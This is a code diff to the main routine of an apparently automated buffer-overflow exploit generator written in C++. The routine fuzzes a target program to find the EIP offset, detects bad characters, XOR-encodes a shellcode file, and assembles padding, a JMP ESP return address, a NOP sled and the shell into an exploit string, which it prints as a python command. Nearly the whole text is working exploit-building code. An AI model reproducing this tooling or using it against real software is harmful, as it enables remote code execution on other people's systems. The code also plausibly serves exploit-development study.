@@ -1,8 +1,10 @@
 #include <iostream>
 #include <string>
 #include "Log/Log.hpp"
+#include "Utility/Filesystem/File.hpp"
 #include "Encoder/XorEncoder.hpp"
 #include "Stages/Fuzzer/Fuzzer.hpp"
+#include "Stages/BadCharacters/BadCharacters.hpp"
 
 void printHelp(char* application)
 {
@@ -29,73 +31,55 @@ int main(int argc, char* argv[])
         return 2;
     }
 
-    std::string shellFilepath = std::string(argv[2]);
     std::string application = std::string(argv[3]);
+
+    // Read payload
+    size_t rawPayloadSize = 0;
+    uint8_t* rawayload = File::readAllBytes(std::string(argv[2]), &rawPayloadSize);
+    if (rawayload == nullptr)
+    {
+        Log::error("Failed to read the payload file...\n");
+        return 3;
+    }
 
     // Run the fuzzer to find EIP
     if (!Fuzzer::run(application))
-        return 3;
+        return 4;
 
-    // Read shell
-    FILE* shellFile = fopen(shellFilepath.c_str(), "rb");
-    fseek(shellFile, 0L, SEEK_END);
-    long shellLength = ftell(shellFile);
-    uint8_t* shell = (uint8_t*)malloc(shellLength);
-    rewind(shellFile);
-    fread(shell, shellLength, 1, shellFile);
-    fclose(shellFile);
+    // Find bad characters
+    if (!BadCharacters::run(application))
+        return 5;
 
     // Encode shell
-    // std::string encodedShell = std::string((char*)shell, shellLength);
-    std::string encodedShell = XorEncoder::encode(shell, shellLength);
-    shellLength = encodedShell.length();
-    free(shell);
-    shell = nullptr;
+    Log::info("XOR encoding payload...\n");
+    std::string shell = XorEncoder::encode(rawayload, rawPayloadSize, Application::badCharacters.data(), Application::badCharacters.size());
 
-    // Allocate payload length
-    size_t payloadLength = Fuzzer::getEipOffset() + 0x04/*EIP*/ + 0x20/*NOP*/ + shellLength/*Shell*/ + 1/*NULL Terminator*/;
+    // Free raw payload
+    free(rawayload);
+    rawayload = nullptr;
 
-    uint8_t* payload = (uint8_t*)malloc(payloadLength);
-    uint32_t offset = 0;
-
-    // Padding
-    for (offset = 0; offset < Fuzzer::getEipOffset(); offset++)
-        payload[offset] = 'A';
-
-    // EIP
-    uint32_t esp = (uint32_t)Fuzzer::getJmpEsp();
-    memcpy(payload + offset, &esp, 4);
-    offset += 4;
-
-    // NOP Sled
-    uint32_t nopEnd = offset + 0x20;
-    for (;offset < nopEnd; offset++)
-        payload[offset] = '\x90';
-
-    // Shell
-    memcpy(payload + offset, encodedShell.c_str(), shellLength);
-    offset += shellLength;
-
-    // NULL Terminator
-    payload[offset] = '\0';
-    offset++;
+    // Build payload
+    Payload* payloadBuilder = Payload::builder()
+        ->padding()
+        ->eip()
+        ->nopSled()
+        ->append(shell);
+    std::string payload = payloadBuilder->get();
+    delete payloadBuilder;
 
     // Output python command
     if (Log::mode == LogMode::Verbose)
     {
-        std::string python = "python -c 'print(\"";
-        for (uint32_t i = 0; i < payloadLength - 1; i++)
+        std::string python = "";
+        for (uint32_t i = 0; i < payload.length(); i++)
         {
             char buffer[5];
             sprintf(buffer, "\\x%02x", (uint8_t)(payload[i]));
             python += std::string(buffer);
         }
-        python += "\")'";
-        Log::success("%s\n", python.c_str());
+        Log::success("[%i bytes] python -c 'print(\"%s\")'\n", payload.length(), python.c_str());
     }
 
-    Log::exploit("%s", payload);
-    free(payload);
-    payload = nullptr;
+    Log::exploit("%s", payload.c_str());
     return 0;
 }
